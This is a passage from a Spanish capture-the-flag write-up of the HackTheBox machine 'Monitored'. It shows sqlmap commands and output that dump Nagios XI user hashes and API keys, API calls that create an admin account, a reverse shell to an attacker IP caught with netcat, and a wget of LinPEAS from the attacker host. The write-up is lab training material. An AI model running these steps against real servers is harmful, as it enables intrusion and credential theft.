</span></span></span></code></pre></div><p>Luego, reviso las bases de datos/databases usando la flag <code>--dbs</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -u &#39;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&#39; -p &#39;id&#39; --cookie=&#39;nagiosxi=dkkthk9urkl17li0bsrn5r2t96&#39; --batch --dbs
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>available databases [2]:
</span></span></span><span class=line><span class=cl><span class=go>[*] information_schema
</span></span></span><span class=line><span class=cl><span class=go>[*] nagiosxi
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Extraigo las tablas de la base de datos <code>nagiosxi</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -u &#39;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&#39; -p &#39;id&#39; --cookie=&#39;nagiosxi=dkkthk9urkl17li0bsrn5r2t96&#39; --batch -D nagiosxi --tables
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Database: nagiosxi
</span></span></span><span class=line><span class=cl><span class=go>[22 tables]
</span></span></span><span class=line><span class=cl><span class=go>+-----------------------------+
</span></span></span><span class=line><span class=cl><span class=go>| xi_auditlog                 |
</span></span></span><span class=line><span class=cl><span class=go>| xi_auth_tokens              |
</span></span></span><span class=line><span class=cl><span class=go>| xi_banner_messages          |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_ccm_backups          |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_favorites            |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_nagiosbpi_backups    |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_scheduledreports_log |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_trapdata             |
</span></span></span><span class=line><span class=cl><span class=go>| xi_cmp_trapdata_log         |
</span></span></span><span class=line><span class=cl><span class=go>| xi_commands                 |
</span></span></span><span class=line><span class=cl><span class=go>| xi_deploy_agents            |
</span></span></span><span class=line><span class=cl><span class=go>| xi_deploy_jobs              |
</span></span></span><span class=line><span class=cl><span class=go>| xi_eventqueue               |
</span></span></span><span class=line><span class=cl><span class=go>| xi_events                   |
</span></span></span><span class=line><span class=cl><span class=go>| xi_link_users_messages      |
</span></span></span><span class=line><span class=cl><span class=go>| xi_meta                     |
</span></span></span><span class=line><span class=cl><span class=go>| xi_mibs                     |
</span></span></span><span class=line><span class=cl><span class=go>| xi_options                  |
</span></span></span><span class=line><span class=cl><span class=go>| xi_sessions                 |
</span></span></span><span class=line><span class=cl><span class=go>| xi_sysstat                  |
</span></span></span><span class=line><span class=cl><span class=go>| xi_usermeta                 |
</span></span></span><span class=line><span class=cl><span class=go>| xi_users                    |
</span></span></span><span class=line><span class=cl><span class=go>+-----------------------------+
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Y dumpeo/extraigo todo el contenido de la tabla <code>xi_users</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sqlmap -u &#39;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&#39; -p &#39;id&#39; --cookie=&#39;nagiosxi=dkkthk9urkl17li0bsrn5r2t96&#39; --batch -D nagiosxi -T xi_users --dump
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Database: nagiosxi
</span></span></span><span class=line><span class=cl><span class=go>Table: xi_users
</span></span></span><span class=line><span class=cl><span class=go>[2 entries]
</span></span></span><span class=line><span class=cl><span class=go>+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
</span></span></span><span class=line><span class=cl><span class=go>| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
</span></span></span><span class=line><span class=cl><span class=go>+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
</span></span></span><span class=line><span class=cl><span class=go>| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
</span></span></span><span class=line><span class=cl><span class=go>| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1715386179   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 4              | 1699697433           |
</span></span></span><span class=line><span class=cl><span class=go>+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Donde obtenemos usuarios y hashes de contrase√±as. Trato de crackear estas contrase√±as, pero no obtengo nada.</p><p>Noto que, adem√°s de contrase√±as, tenemos un par√°metro llamado <code>api_key</code>, el cual es <code>IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL</code> para el usuario <code>admin</code>.</p><p>Basado en los endpoints de API que hemos encontrado previamente, adem√°s de lo especificado en la documentaci√≥n de <code>Nagios XI</code> mostrada previamente, la <code>api_key</code> puede ser requerida en:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/nagiosxi/api/vi/admin?apikey=&lt;API-KEY&gt;
</span></span></code></pre></div><p>Si uso la <code>api_key</code> encontrada/dumpeada de la base de datos <code>SQL</code> del usuario <code>svc</code> con <code>cURL</code> tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s &#39;https://nagios.monitored.htb/nagiosxi/api/v1/admin?apikey=2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK&#39; --insecure
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;error&#34;:&#34;Account is disabled&#34;}
</span></span></span></code></pre></div><p>y si uso la <code>api_key</code> del usuario <code>admin</code> de la base de datos, tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s &#39;https://nagios.monitored.htb/nagiosxi/api/v1/admin?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#39; --insecure
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>No Endpoint: admin
</span></span></span></code></pre></div><p>de manera que necesitamos encontrar un endpoint correcto para esta <code>api_key</code>.</p><p>Siguiendo las instrucciones de <a href="https://support.nagios.com/forum/viewtopic.php?f=16&amp;t=42923" class=external-link target=_blank rel=noopener>este post de foro de Nagios XI</a> podemos ver c√≥mo crear nuevos usuarios. M√°s espec√≠ficamente, la siguiente parte nos es de inter√©s:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>curl -XPOST &#34;http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&amp;pretty=1&#34; -d &#34;username=jmcdouglas&amp;password=test&amp;name=Jordan%20McDouglas&amp;email=jmcdouglas@localhost&#34;
</span></span></span><span class=line><span class=cl><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>    &#34;success&#34;: &#34;User account jmcdouglas was added successfully!&#34;,
</span></span></span><span class=line><span class=cl><span class=go>    &#34;userid&#34;: 13
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span></code></pre></div><p>de manera que reemplazo el valor de <code>apikey</code> con el valor hallado para el usuario <code>admin</code> y agrego un usuario con credenciales <code>gunzf0x:gunzf0x123</code>. Hago esto corriendo el siguiente comando con <code>cURL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X POST --insecure &#39;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#39; -d &#39;username=gunzf0x&amp;password=gunzf0x123&amp;name=Tester&amp;email=gunzf0x@htb.com&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;success&#34;:&#34;User account gunzf0x was added successfully!&#34;,&#34;user_id&#34;:6}
</span></span></span></code></pre></div><p>Puedo loguear con este usuario en <code>https://nagios.monitored.htb/nagiosxi/login.php</code> (el panel de login de siempre). Me pide aceptar unos t√©rminos y condiciones (que obviamente le√≠mos) y, posteriormente, cambiar nuestra contrase√±a. Una vez logueados simplemente veo el mismo panel de login que el usuario <code>svc</code>. De manera que, similar a m√°quinas previas de HTB, podemos tratar de crear un usuario con privilegios de &ldquo;admin&rdquo; al momento de crear un usuario. Tal cual se explica en <a href="https://support.nagios.com/forum/viewtopic.php?f=6&amp;t=40502" class=external-link target=_blank rel=noopener>este post</a>, podemos agregar el par√°metro <code>auth_level=admin</code> al momento de crear el usuario. De manera que creo un nuevo usuario llamado <code>gunzf0x2</code> y la misma contrase√±a de antes, pero ahora con mayores privilegios.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s -X POST --insecure &#39;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#39; -d &#39;username=gunzf0x2&amp;password=gunzf0x123&amp;name=Tester&amp;email=gunzf0x@htb.com&amp;auth_level=admin&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{&#34;success&#34;:&#34;User account gunzf0x2 was added successfully!&#34;,&#34;user_id&#34;:7}
</span></span></span></code></pre></div><p>Noto, adem√°s, que puedo ver los usuarios creados visitando el siguiente endpoint, pero haciendo una petici√≥n por <code>GET</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s --insecure &#39;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&#39; | jq
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>{
</span></span></span><span class=line><span class=cl><span class=go>  &#34;records&#34;: 4,
</span></span></span><span class=line><span class=cl><span class=go>  &#34;users&#34;: [
</span></span></span><span class=line><span class=cl><span class=go>    {
</span></span></span><span class=line><span class=cl><span class=go>      &#34;user_id&#34;: &#34;7&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;username&#34;: &#34;gunzf0x2&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;name&#34;: &#34;Tester&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;email&#34;: &#34;gunzf0x@htb.com&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;enabled&#34;: &#34;1&#34;
</span></span></span><span class=line><span class=cl><span class=go>    },
</span></span></span><span class=line><span class=cl><span class=go>    {
</span></span></span><span class=line><span class=cl><span class=go>      &#34;user_id&#34;: &#34;6&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;username&#34;: &#34;gunzf0x&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;name&#34;: &#34;Tester&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;email&#34;: &#34;gunzf0x@htb.com&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;enabled&#34;: &#34;1&#34;
</span></span></span><span class=line><span class=cl><span class=go>    },
</span></span></span><span class=line><span class=cl><span class=go>    {
</span></span></span><span class=line><span class=cl><span class=go>      &#34;user_id&#34;: &#34;2&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;username&#34;: &#34;svc&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;name&#34;: &#34;svc&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;email&#34;: &#34;svc@monitored.htb&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;enabled&#34;: &#34;0&#34;
</span></span></span><span class=line><span class=cl><span class=go>    },
</span></span></span><span class=line><span class=cl><span class=go>    {
</span></span></span><span class=line><span class=cl><span class=go>      &#34;user_id&#34;: &#34;1&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;username&#34;: &#34;nagiosadmin&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;name&#34;: &#34;Nagios Administrator&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;email&#34;: &#34;admin@monitored.htb&#34;,
</span></span></span><span class=line><span class=cl><span class=go>      &#34;enabled&#34;: &#34;1&#34;
</span></span></span><span class=line><span class=cl><span class=go>    }
</span></span></span><span class=line><span class=cl><span class=go>  ]
</span></span></span><span class=line><span class=cl><span class=go>}
</span></span></span></code></pre></div><p>donde puedo ver mis 2 usuarios creados.</p><p>De manera que vuelvo al panel de login de siempre, pero esta vez me logueo con el segundo usuario agregado el cual deber√≠a tener privilegios de administrador en el servicio. Similar a la primera cuenta, la p√°gina nos pide aceptar algunos t√©rminos y condiciones (que obviamente volv√≠ a leer) y cambiar la contrase√±a. Hecho esto ahora noto que el panel que se muestra es levemente diferente al que tuvimos acceso:</p><p><img alt="Monitored 8" src=/pentesting/images/Monitored_8.png></p><p>Las principales diferencias es que ahora puedo ver las opciones <code>Configure</code> y <code>Admin</code>.
Yendo a <code>Configure -> Core Config Manager</code> puedo ver algo como:</p><p><img alt="Monitored 9" src=/pentesting/images/Monitored_9.png></p><p>Si clickeamos en <code>Commands</code> (Comandos) podemos ver m√∫ltiples tareas:</p><p><img alt="Monitored 10" src=/pentesting/images/Monitored_10.png></p><p>Clickeando en <code>Add New</code> (Agregar Nuevo) agrego un nuevo comando llamado <code>rev-shell</code> y agrego el siguiente contenido:</p><p><img alt="Monitored 11" src=/pentesting/images/Monitored_11.png></p><p>donde <code>10.10.16.6</code> es mi IP de atacante y <code>443</code> es el puerto por el cual empezar√© a escuchar con <code>netcat</code>. Adem√°s, noto que todos los comandos que ya han sido agregados previamente usan paths absolutos para los binarios, de manera que &ndash;para asegurarme de que funcione&ndash; agrego <code>/bin/bash</code> en lugar de simplemente <code>bash</code>.
Clickeo en <code>Save</code> (Guardar) y, luego, de vuelta a la lista que muestra los comandos voy a la parte inferior de la p√°gina y clickeo en <code>Apply Configuration</code> (Aplicar Configuraci√≥n). Luego, vuelvo a <code>Configure -> Core Config Manager</code>, pero esta vez realizamos click en <code>Services</code>, <code>Add-New</code> y creo un nuevo servicio:</p><p><img alt="Monitored 12" src=/pentesting/images/Monitored_12.png></p><p>Al final de esta p√°gina tenemos un bot√≥n <code>Run Check Command</code> (Correr Comando de Chequeo). Al clickear en este me aparece una ventana emergente la cual muestra alguna informaci√≥n del comando:</p><p><img alt="Monitored 13" src=/pentesting/images/Monitored_13.png></p><p>Antes de volver a clickear en <code>Run Check Command</code> en la ventana emergente, me pongo en escucha con <code>netcat</code> en el puerto <code>443</code>. Una vez ya en escucha, clickeo en <code>Run Check Command</code> y obtengo una shell como el usuario <code>nagios</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.6] from (UNKNOWN) [10.10.11.248] 48276
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (16894): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>nagios@monitored:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>nagios
</span></span></span></code></pre></div><p>donde podemos obtener la flag de usuario en el mismo directorio <code>/home</code> del usuario <code>nagios</code>.</p><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Decido pasar <code>LinPEAS</code> (el cual puede ser obtenido desde <a href=https://github.com/peass-ng/PEASS-ng/releases/tag/20240505-284a0ce8 class=external-link target=_blank rel=noopener>su repositorio de Github</a>) a la m√°quina v√≠ctima empezando un servidor <code>HTTP</code> temporal de <code>Python</code> en mi m√°quina en el puerto <code>8080</code> donde el archivo <code>linpeas.sh</code> se encuentra localizado:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</span></span></span></code></pre></div><p>y lo descargo en la m√°quina v√≠ctima corriendo en √©sta:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>nagios@monitored:~$ wget http://10.10.16.6:8080/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-05-10 23:03:40--  http://10.10.16.6:8080/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go>Connecting to 10.10.16.6:8080... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 847815 (828K) [text/x-sh]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äòlinpeas.sh‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>linpeas.sh                              100%[============================================================================&gt;] 827.94K   111KB/s    in 7.5s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024-05-10 23:03:50 (111 KB/s) - ‚Äòlinpeas.sh‚Äô saved [847815/847815]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ mv ./linpeas.sh /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ chmod +x !$
</span></span></span><span class=line><span class=cl><span class=go>chmod +x /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>nagios@monitored:~$ !$
</span></span></span><span class=line><span class=cl><span class=go>/tmp/linpeas.sh
</span></span></span></code></pre></div><p>Del output de <code>LinPEAS</code> puedo ver algo interesante:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Readable files belonging to root and readable by me but not world readable
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 3820 Nov  9  2023 /usr/local/nagiosxi/scripts/manage_ssl_config.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 7861 Nov  9  2023 /usr/local/nagiosxi/scripts/backup_xi.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 9615 Nov  9  2023 /usr/local/nagiosxi/scripts/pg2mysql/convert_nagiosxi_to_mysql.php
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 6166 Nov  9  2023 /usr/local/nagiosxi/scripts/reset_config_perms.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 1654 Nov  9  2023 /usr/local/nagiosxi/scripts/repair_databases.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 1914 Nov  9  2023 /usr/local/nagiosxi/scripts/change_timezone.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 1270 Nov  9  2023 /usr/local/nagiosxi/scripts/import_xiconfig.php
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 3917 Nov  9  2023 /usr/local/nagiosxi/scripts/manage_services.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 4153 Nov  9  2023 /usr/local/nagiosxi/scripts/repairmysql.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 2914 Nov  9  2023 /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 1534 Nov  9  2023 /usr/local/nagiosxi/scripts/send_to_nls.php
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 281115 Nov  9  2023 /usr/local/nagiosxi/scripts/components/autodiscover_new.php
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 16693 Nov  9  2023 /usr/local/nagiosxi/scripts/components/getprofile.sh
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 6296 Nov  9  2023 /usr/local/nagiosxi/scripts/migrate/nagios_bundler.py
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 8612 Nov  9  2023 /usr/local/nagiosxi/scripts/migrate/migrate.php
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 18851 Nov  9  2023 /usr/local/nagiosxi/scripts/migrate/nagios_unbundler.py
</span></span></span><span class=line><span class=cl><span class=go>-r-xr-x--- 1 root nagios 999 Nov  9  2023 /usr/local/nagiosxi/etc/xi-sys.cfg
</span></span></span><span class=line><span class=cl><span class=go>-rw-r----- 1 root nagios 33 May 10 18:50 /home/nagios/user.txt
</span></span></span></code></pre></div><p>donde el archivo <code>/usr/local/nagiosxi/scripts/manage_services.sh</code> se ve interesante.</p><p>Adem√°s, noto que este archivo puede correr <code>sudo</code> como <code>root</code> sin proporcionar contrase√±a:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Checking &#39;sudo -l&#39;, /etc/sudoers, and /etc/sudoers.d
</span></span></span><span class=line><span class=cl><span class=go>‚ïö https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
</span></span></span><span class=line><span class=cl><span class=go>Matching Defaults entries for nagios on localhost:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User nagios may run the following commands on localhost:
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios start
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios stop
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios restart
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios reload
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios status
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/nagios checkconfig
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/npcd start
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/npcd stop
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/npcd restart
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/npcd reload
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /etc/init.d/npcd status
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
</span></span></span></code></pre></div><p>Chequeando el archivo <code>manage_services.sh</code> tenemos que este contiene:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Manage Services (start/stop/restart)</span>
</span></span><span class=line><span class=cl><span class=c1># Copyright (c) 2015-2020 Nagios Enterprises, LLC. All rights reserved.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># =====================</span>
</span></span><span class=line><span class=cl><span class=c1># Built to allow start/stop/restart of services using the proper method based on</span>
</span></span><span class=line><span class=cl><span class=c1># the actual version of operating system.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Examples:</span>
</span></span><span class=line><span class=cl><span class=c1># ./manage_services.sh start httpd</span>
</span></span><span class=line><span class=cl><span class=c1># ./manage_services.sh restart mysqld</span>
</span></span><span class=line><span class=cl><span class=c1># ./manage_services.sh checkconfig nagios</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>BASEDIR</span><span class=o>=</span><span class=k>$(</span>dirname <span class=k>$(</span>readlink -f <span class=nv>$0</span><span class=k>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Import xi-sys.cfg config vars</span>
</span></span><span class=line><span class=cl>. <span class=nv>$BASEDIR</span>/../etc/xi-sys.cfg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Things you can do</span>
